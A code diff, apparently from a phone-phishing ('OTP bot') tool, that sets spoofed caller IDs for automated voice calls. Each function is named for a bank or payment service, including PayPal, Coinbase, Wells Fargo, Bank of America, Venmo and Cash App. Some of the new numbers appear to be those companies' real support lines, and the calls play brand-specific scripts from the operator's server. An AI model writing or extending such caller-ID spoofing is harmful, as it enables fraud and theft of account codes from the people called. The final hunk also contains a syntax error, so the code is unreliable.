@@ -11,7 +11,7 @@ module.exports.paypal = async(number) => {
         client.calls.create({
             "url": `${url}/voice`,
             "to": number,
-            "from": ""
+            "from": "+18882211161"
         }).then(call => {
             if(call) {
                 resolve(call)
@@ -27,7 +27,7 @@ module.exports.coinbase = async(number, message) => {
         client.calls.create({
             "url": `${url}/coinbase`,
             "to": number,
-            "from": "+13307528307"
+            "from": "+18889087930"
         }).then(call => {
             if(call) {
                 resolve(call)
@@ -43,7 +43,7 @@ module.exports.quadpay = async(number, message) => {
         client.calls.create({
             "url": `${url}/quadpay`,
             "to": number,
-            "from": "+13307528307"
+            "from": "+18882743159"
         }).then(call => {
             if(call) {
                 resolve(call)
@@ -59,7 +59,7 @@ module.exports.robinhood = async(number, message) => {
         client.calls.create({
             "url": `${url}/robinhood`,
             "to": number,
-            "from": "+13307528307"
+            "from": "+16507617789"
         }).then(call => {
             if(call) {
                 resolve(call)
@@ -75,7 +75,7 @@ module.exports.amazon = async(number, message) => {
         client.calls.create({
             "url": `${url}/amazon`,
             "to": number,
-            "from": "+13307528307"
+            "from": "+18882804331"
         }).then(call => {
             if(call) {
                 resolve(call)
@@ -91,7 +91,7 @@ module.exports.wellsfargo = async(number, message) => {
         client.calls.create({
             "url": `${url}/wellsfargo`,
             "to": number,
-            "from": "+13307528307"
+            "from": "+18008693557"
         }).then(call => {
             if(call) {
                 resolve(call)
@@ -107,7 +107,7 @@ module.exports.boa = async(number, message) => {
         client.calls.create({
             "url": `${url}/boa`,
             "to": number,
-            "from": "+13307528307"
+            "from": "+18004321000"
         }).then(call => {
             if(call) {
                 resolve(call)
@@ -123,7 +123,7 @@ module.exports.venmo = async(number, message) => {
         client.calls.create({
             "url": `${url}/venmo`,
             "to": number,
-            "from": "+13307528307"
+            "from": "+18558124430"
         }).then(call => {
             if(call) {
                 resolve(call)
@@ -139,7 +139,7 @@ module.exports.cashapp = async(number, message) => {
         client.calls.create({
             "url": `${url}/cashapp`,
             "to": number,
-            "from": "+13307528307"
+            "from": +18009691940"
         }).then(call => {
             if(call) {
                 resolve(call)
